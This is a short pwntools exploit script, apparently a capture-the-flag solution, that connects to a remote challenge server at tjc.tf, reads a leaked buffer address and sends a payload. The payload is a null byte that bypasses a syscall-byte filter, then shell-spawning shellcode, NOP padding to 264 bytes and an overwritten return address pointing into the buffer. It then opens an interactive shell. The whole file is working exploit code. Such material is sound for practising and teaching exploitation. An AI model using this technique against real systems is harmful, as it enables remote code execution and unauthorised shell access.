from pwn import *

context.clear(arch="amd64")
# p = process("./chall")
p = remote("tjc.tf", 31365)

buf_addr_str = p.clean(timeout=1).decode()
buf_addr = int(buf_addr_str, 16)

shellcode = asm(shellcraft.sh())
shellcode += asm(shellcraft.exit())

payload = b"\x00" # bypass syscall(0f 85) check
payload += shellcode
payload += b"\x90" * (264 - 1 - len(shellcode))
payload += p64(buf_addr + 0x1)
p.sendline(payload)

p.interactive()
